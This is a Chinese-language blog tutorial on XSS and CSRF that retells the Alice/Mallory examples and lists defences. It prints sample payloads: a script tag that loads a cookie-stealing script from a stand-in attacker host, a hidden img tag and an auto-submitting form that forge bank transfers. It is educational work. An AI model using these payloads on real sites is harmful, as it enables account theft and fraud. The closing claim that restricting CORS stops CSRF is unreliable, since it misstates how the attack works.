---
layout: post
title: xss and csrf
---

## xss

wiki里讲了两个xss攻击的例子. 非持续性xss(Non-persistent)，也称为Reflected xss.(来自陌生人的) 与 持续性(Persistent)攻击。

### Non-persistent

Alice 经常去一个Blob的网站，且Blob的网站允许Alice使用username/password登录和存储一些敏感信息，
当用户登录的时候Blob会将认证凭据存到Cookie中以供client到server端验证身份。

Mallory发现Bob的网站存在reflected xss 漏洞, 过程如下:

* 当在搜索页面，Mallory输入一些词汇并点击提交按钮, 如果找不到结果blob的页面会提示这个词汇 Not found, 此时的页面URL为`http://blobwebsite.com?q=her input term`

* 对于一个正常的搜索，例如搜索`pupples`, 如果该搜索页面未找到的话会提示`pupples not found`, 此时的url为`http://blobwebsite.com?q=pupples`

* 然而，当Mallory提交一个正常的搜索请求，例如`<script type='text/javascript'>alert('xss');</script>`, 出现了下面几个现象: 1. 一个弹窗出现，弹出"xss", 2.伴随着弹窗的同时页面显示`<script type='text/javascript'>alert('xss');</script> not found` 3. 此时的url为`http:blobwebsite.com?q=<script%20type='text/javascript'>alert('xss');</script>`


在发现了存在xss漏洞之后，Mallory手写了一个url: `http:blobwebsite.com?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E`, 看起来像一个正常的url，但是decode其中的hex字符之后，真实的url如下:`http:blobwebsite.com?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></script>`。

接着Mallory将该地址通过email的形式发送给一些使用blobwebsite的成员，并且还告诉他们一些诱导性信息，例如:  [点击查看可爱的小狗狗](https://www.google.com/search?q=cute+puppy&tbm=isch&tbo=u&source=univ&sa=X&ved=0ahUKEwjB587hru_TAhUV3GMKHXgJAO4QsAQIIg&biw=1263&bih=703)

当该email被喜欢小狗的alice打开的时候，即使Alice比较有心的查看了url之后恐怕也不会过度起疑。但是当Alice随手点开这条链接之后会看到`pupples not found`以及伴随着的Mallory脚本的执行。(此时便触发了xss攻击行为)。 这时候Mallory的脚本几乎可做任何事情, 包括将Alice的登录凭证Cookie发送给Mallory的服务器。 拿到登录凭证之后Mallory便可以伪装成Alice登录到blobwebsite，并且查看其敏感信息。更加过分一些还可以更改掉Alice的密码，让Alice无法登陆。


xss攻击的预防可以用下面几种方法

* 通过合适的编码进行检查搜索输入中含有的HTML敏感数据，例如`script`,`object`,`embed`,`link`,`iframe`
* web server可以重定向无效的请求。 例如当Alice的请求含有xss的链接后，server端进行检查之后直接重定向到安全页面
* web server可以检测同时登陆行为，并且可以将登陆凭据设置为过期.
* web server检测到同时登陆来自不同ip后将client的session设置为过期
* 网站可以只显示部分信用卡号码(意味敏感信息数据即使登陆后也不能直接查看完整信息，需要二次验证)
* 网站可以在用户更改注册信息时，例如密码，需要再次输入密码。
* 网站可以使用[Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)(内容安全策略) 来指定允许加载的脚本。
* 告诉用户不要随意点击不可信链接
* 设置Cookie为`HttpOnly` 来阻止JavaScript访问Cookie


### Persistent attack

接着上面的例子，Non-persistent需要Mallory发email给注册了Blob网站的用户，受影响的仅限于邮件内用户。这时候Mallory换了一种思路，使用持续性xss来影响更大范围内的用户。

首先Mallory注册了一个Blob网站的账号。

Mallory发现Blob的网站存在一个xss漏洞: 如果你在一个帖子下面留言，那么评论里将显示你输入的任何内容. 如果输入中含有html标签，评论区也会显示相应的标签和运行其中的脚本。

接着Mallory在一个帖子下面发了一条留言`I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">`

当其他人(不只是作者)加载该页面时Mallory的脚本都会被执行，并且偷取他们的Cookie发送到Mallory的服务器。

之后Mallory就可以使用这些登录凭据来做任何事情了。


### 结语

其实xss的种类有很多种，其中原理几乎全部是想尽办法将恶意脚本注入页面内，并且执行攻击者的脚本。
上面的xss防范方法对于很多情况下都适用。


## csrf

CSRF意思为跨站请求伪造，也就是让客户自己不知情的情况下发起一个恶意请求，网站服务器接收到请求后以为是用户自己发出的执行一些非常规性操作。 CSRF并不能偷取用户数据，但能以用户的身份发起恶意请求。

攻击流程大致如下:

假设Alice向Blob转账一笔钱的请求为`GET`请求，url为`GET http://bank.com/transfer.do?acct=BLOB&amount=100 HTTP/1.1
`

Mallory发现了back.com网站存在CSRF漏洞(没有开启同源策略)，于是构造了一条向自己转账的链接`http://bank.com/transfer.do?acct=Mallory&amount=100000`

接着Mallory可以给Alice发一封HTML邮件，例如一个可点击的链接`<a href="http://bank.com/transfer.do?acct=Mallory&amount=100000">View my Pictures!</a>` 但可能还不够好，因为该请求不会自动执行，于是Mallory决定使用一张0*0大小的图片来代替
`<img src="http://bank.com/transfer.do?acct=Mallory&amount=100000" width="0" height="0" border="0">`
这样当Alice打开这封邮件时便会自动发起这条GET请求，达到攻击的目的。

如果转账的请求为`POST`, 例如

~~~
POST http://bank.com/transfer.do HTTP/1.1

acct=BLOB&amount=100
~~~

此时便可以构造一个特殊的邮件内容下

~~~
<body onload="document.forms[0].submit()">
<form action="http://bank.com/transfer.do" method="POST">
<input type="hidden" name="acct" value="Mallory"/>
<input type="hidden" name="amount" value="100000"/>
<input type="submit" value="View my pictures"/>
</form>
~~~

这样当Alice打开邮件后便会发起这条POST请求，并达到攻击的目的。

类似的其他HTTP方法，`PUT` 和 `DELETE` 原理类似，可以手动通过`XMLHttpRequest`的方式来发起请求。 不过CSRF目前基本上可用之处已经很少见了，只要web server不允许无限制跨域便可以阻止 CSRF 型攻击方式。

所以，当心你的 `Access-Control-Allow-Origin: *`
